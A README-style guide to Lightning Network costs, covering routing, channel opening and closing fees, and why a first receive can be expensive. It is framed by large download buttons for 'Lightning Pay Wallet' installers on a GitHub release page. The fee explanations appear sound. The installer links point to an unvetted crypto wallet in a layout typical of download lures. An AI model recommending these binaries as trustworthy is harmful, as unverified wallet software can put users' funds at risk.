<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# What a Lightning payment costs, including channel fees
Three costs exist. Only one of them is charged per payment.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

Lightning is cheap, but "cheap" hides three different costs with three different triggers. Knowing
which one applies is the difference between a payment that costs a fraction of a satoshi and a first
receive that costs more than the payment itself.

## Routing fees, per payment

A payment crosses one or more channels, and each hop takes a small fee. These are fractions of a
satoshi in normal conditions, set by the nodes along the route rather than by the wallet. Nothing is
charged when a payment fails.

This is the cost people mean when they say Lightning is nearly free, and for routine payments it is
accurate.

## Opening a channel, once

A channel is an on-chain transaction, so opening it pays an on-chain fee set by block space. It is
paid once per channel, not per payment, and it is the reason a first receive can look expensive: if
your wallet has to open a channel to accept the money, that opening is the cost.

The same applies when you send into a wallet with no outbound capacity and the wallet opens a channel
to make the payment possible.

## Closing a channel, once

Closing is also on-chain and also pays a fee. A wallet may keep a reserve behind precisely so it can
close cleanly, which is why a balance that will not empty to zero is normal rather than a bug.

## Receiving: who pays

If you receive into an existing channel, you pay nothing beyond the sender's routing fee. If you
receive into a wallet with no inbound capacity, your side funds the opening. That asymmetry is the
whole explanation for "why did receiving cost me money", and it is worth reading twice.

## The cheapest way to move money

For small amounts, a Lightning payment inside an existing channel is the cheapest rail available. For
large amounts, an on-chain transfer can be cheaper per unit because it does not need a channel built
for it. The crossover depends on the on-chain fee at the time, which is why no fixed rule holds for
long.

## What the wallet does not charge

There is no monthly fee and no percentage taken by the wallet. The costs above are network costs:
routing fees to nodes and on-chain fees to miners. A product that took a cut would say so, and this
one does not take one.

## Questions people ask

### Is Lightning free?

No, but a routine payment costs a fraction of a satoshi. Opening a channel is where real money
appears, and it happens rarely.

### Do I pay the opening fee again when I top up?

Not for the same channel. A new channel is a new opening. Topping up a balance inside an existing
channel does not repeat the on-chain cost.

### Why does a receive cost more than the amount I asked for?

Because the wallet had to open a channel, and that opening is an on-chain transaction. It is a
one-off, not a fee on the payment.

## Related guides

- [How to send a Lightning payment, step by step](https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/send-a-lightning-payment.md)
- [Do you have to manage Lightning channels yourself?](https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/manage-lightning-channels.md)
- [How fast a Lightning payment is, and what a satoshi is worth](https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/how-fast-is-a-lightning-payment.md)

